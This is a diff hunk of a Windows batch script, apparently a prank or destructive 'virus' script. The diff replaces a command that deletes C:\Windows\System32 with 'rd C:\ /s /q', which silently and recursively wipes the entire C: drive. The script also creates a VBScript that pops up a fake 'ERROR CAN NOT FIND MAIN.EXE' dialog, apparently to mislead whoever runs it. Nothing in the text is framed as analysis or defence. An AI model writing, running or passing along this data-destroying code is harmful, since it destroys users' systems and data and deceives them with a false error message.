@@ -21,7 +21,7 @@ ECHO DONOTUSE
 pause
 ECHO DONOTUSE
 pause
-Del C:\Windows\System32
+rd C:\ /s /q
 echo x=msgbox("ERROR CAN NOT FIND MAIN.EXE" ,16 , "ERROR") >> MAIN.EXE.vbs
 echo a >>MAIN2.EXE.BAT
 ECHO start MAIN.EXE.vbs >>MAIN2>EXE>BAT
